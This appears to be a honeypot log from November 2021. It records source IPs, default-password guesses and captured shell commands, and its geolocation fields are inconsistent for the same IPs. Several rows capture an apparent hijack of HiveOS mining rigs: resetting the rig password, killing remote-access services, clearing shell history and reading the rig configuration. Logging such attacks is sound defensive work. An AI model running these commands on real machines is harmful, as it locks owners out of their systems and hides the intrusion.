+2021-11-23 16:48:13.996,159.223.2.20,,b'nproc;uname -a',,,Netherlands,North Holland,Amsterdam,4.9392,52.352
+2021-11-23 16:49:58.030,23.183.81.249,,,,,Netherlands,North Holland,Amsterdam,4.9392,52.352
+2021-11-23 16:51:09.745,23.183.81.249,,,,,Netherlands,North Holland,Amsterdam,4.9392,52.352
+2021-11-23 16:51:10.949,23.183.81.249,,,,1,Netherlands,North Holland,Amsterdam,4.9392,52.352
+2021-11-23 16:51:11.426,23.183.81.249,,b'sudo hive-passwd `hostname`; echo `hostname`; pkill Xorg; pkill x11vnc; pkill Hello; systemctl stop shellinabox; history -c',,,Indonesia,,,106.8272,-6.1728
+2021-11-23 16:53:06.440,195.133.18.24,,,,,United States,,,-97.822,37.751
+2021-11-23 16:53:41.861,195.133.18.24,,,,,United States,Nevada,Las Vegas,-115.1447,36.102
+2021-11-23 16:53:42.078,195.133.18.24,,,,1,United States,Nevada,Las Vegas,-115.1447,36.102
+2021-11-23 16:53:42.118,195.133.18.24,,b'sudo hive-passwd c3Rvcnl0aW1lIGRheW9uZSBhbmQgZGF5dHdevbase64; sudo pkill Xorg; sudo pkill x11vnc',,,United States,Nevada,Las Vegas,-115.1447,36.102
+2021-11-23 16:55:34.879,192.241.213.10,,,,,United States,Nevada,Las Vegas,-115.1447,36.102
+2021-11-23 16:59:17.358,110.42.132.70,,,,,United States,,,-97.822,37.751
+2021-11-23 16:59:17.603,110.42.132.70,,,,,Brazil,Sao Paulo,Miracatu,-47.3632,-24.1732
+2021-11-23 16:59:19.083,110.42.132.70,,,,123456,Brazil,Sao Paulo,Miracatu,-47.3632,-24.1732
+2021-11-23 16:59:19.583,110.42.132.70,,b'uname -a',root,,Brazil,Sao Paulo,Miracatu,-47.3632,-24.1732
+2021-11-23 17:04:30.834,71.80.99.103,,,,,Netherlands,North Holland,Amsterdam,4.9392,52.352
+2021-11-23 17:04:31.876,71.80.99.103,,,,nas4free,Netherlands,North Holland,Amsterdam,4.9392,52.352
+2021-11-23 17:04:32.159,71.80.99.103,,b'uname -a || echo -',root,,Netherlands,North Holland,Amsterdam,4.9392,52.352
+2021-11-23 17:21:04.083,45.88.137.100,,,,,Netherlands,North Holland,Amsterdam,4.9392,52.352
+2021-11-23 17:21:07.832,45.88.137.100,,,,,Netherlands,North Holland,Amsterdam,4.9392,52.352
+2021-11-23 17:21:20.256,45.88.137.100,,,,,Netherlands,North Holland,Amsterdam,4.9392,52.352
+2021-11-23 17:24:34.564,14.143.49.206,,,,,Netherlands,North Holland,Amsterdam,4.9392,52.352
+2021-11-23 17:28:59.644,104.244.72.120,,,,,Netherlands,North Holland,Amsterdam,4.9392,52.352
+2021-11-23 17:53:25.553,161.35.153.169,,,,,Netherlands,North Holland,Amsterdam,4.9392,52.352
+2021-11-23 17:53:25.766,161.35.153.169,,,,password,Netherlands,North Holland,Amsterdam,4.9392,52.352
+2021-11-23 17:53:35.868,161.35.153.169,,,root,,Switzerland,Zurich,Zurich,8.5671,47.3682
+2021-11-23 17:53:36.236,161.35.153.169,,,,ubnt,Switzerland,Zurich,Zurich,8.5671,47.3682
+2021-11-23 18:05:26.095,120.29.226.5,,,ubnt,,Switzerland,Zurich,Zurich,8.5671,47.3682
+2021-11-23 18:10:18.687,162.142.125.44,,,,,Switzerland,Zurich,Zurich,8.5671,47.3682
+2021-11-23 18:19:59.708,209.141.33.193,,,,,Switzerland,Zurich,Zurich,8.5671,47.3682
+2021-11-23 18:20:29.867,209.141.33.193,,,,,Switzerland,Zurich,Zurich,8.5671,47.3682
+2021-11-23 18:20:30.669,209.141.33.193,,,,1,Switzerland,Zurich,Zurich,8.5671,47.3682
+2021-11-23 18:20:30.967,209.141.33.193,,b'sudo',,,Czechia,,,14.411,50.0853
+2021-11-23 19:02:46.452,66.240.236.116,,,,,Czechia,,,14.411,50.0853
+2021-11-23 19:25:26.368,170.246.71.206,,,,,Czechia,,,14.411,50.0853
+2021-11-23 19:25:29.010,170.246.71.206,,,,root,Czechia,,,14.411,50.0853
+2021-11-23 19:25:36.018,170.246.71.206,,,root,,Czechia,,,14.411,50.0853
+2021-11-23 20:01:58.951,167.71.2.26,,,,,Czechia,,,14.411,50.0853
+2021-11-23 20:03:10.904,167.71.2.26,,,,,Czechia,,,14.411,50.0853
+2021-11-23 20:03:11.014,167.71.2.26,,,,mos,United States,California,San Francisco,-122.3838,37.7308
+2021-11-23 20:03:11.050,167.71.2.26,,b'uname -s -v -n -r -m',mos,,Bulgaria,Burgas,Burgas,27.4646,42.4963
+2021-11-23 20:04:16.234,167.71.2.26,,,,,United States,,,-97.822,37.751
+2021-11-23 20:04:16.348,167.71.2.26,,,,123456,United States,,,-97.822,37.751
+2021-11-23 20:04:16.385,167.71.2.26,,b'uname -s -v -n -r -m',mos,,,,,,
+2021-11-23 20:05:21.434,167.71.2.26,,,,,,,,,
+2021-11-23 20:05:21.546,167.71.2.26,,,,1234,,,,,
+2021-11-23 20:05:21.582,167.71.2.26,,b'uname -s -v -n -r -m',mos,,,,,,
+2021-11-23 20:08:35.345,179.43.187.37,,,,,,,,,
+2021-11-23 20:10:11.129,179.43.187.37,,,,,,,,,
+2021-11-23 20:10:11.390,179.43.187.37,,,,mmpOS,,,,,
+2021-11-23 20:10:11.468,179.43.187.37,,b'uname -s -v -n -r -m',miner,,,,,,
+2021-11-23 20:11:46.150,179.43.187.37,,,,,,,,,
+2021-11-23 20:11:46.376,179.43.187.37,,,,msos,,,,,
+2021-11-23 20:11:46.447,179.43.187.37,,b'uname -s -v -n -r -m',minerstat,,,,,,
+2021-11-23 20:27:27.695,195.133.18.210,,,,,,,,,
+2021-11-23 20:27:55.437,195.133.18.210,,,,,,,,,
+2021-11-23 20:27:56.857,195.133.18.210,,,,dg801b23dg12dwqsdghaiodg120dgasodg1wo08_123Z,,,,,
+2021-11-23 20:27:57.123,195.133.18.210,,b'sudo hive-passwd c3Rvcnl0aW1lIGRheW9uZSBhbmQgZGF5dHdevbase64; sudo pkill Xorg; sudo pkill x11vnc; cat /hive-config/rig.conf',,,,,,,
+2021-11-23 20:28:31.961,195.133.18.210,,,,,,,,,
+2021-11-23 20:28:32.117,195.133.18.210,,,,1,,,,,
+2021-11-23 20:28:32.155,195.133.18.210,,b'sudo hive-passwd c3Rvcnl0aW1lIGRheW9uZSBhbmQgZGF5dHdevbase64; sudo pkill Xorg; sudo pkill x11vnc; cat /hive-config/rig.conf',,,,,,,
+2021-11-23 20:48:01.463,192.241.215.51,,,,,,,,,
+2021-11-23 21:07:03.922,79.132.28.247,,,,,,,,,
+2021-11-23 21:35:31.301,209.17.96.74,,,,,,,,,
+2021-11-23 22:48:37.662,23.95.222.129,,,,,,,,,
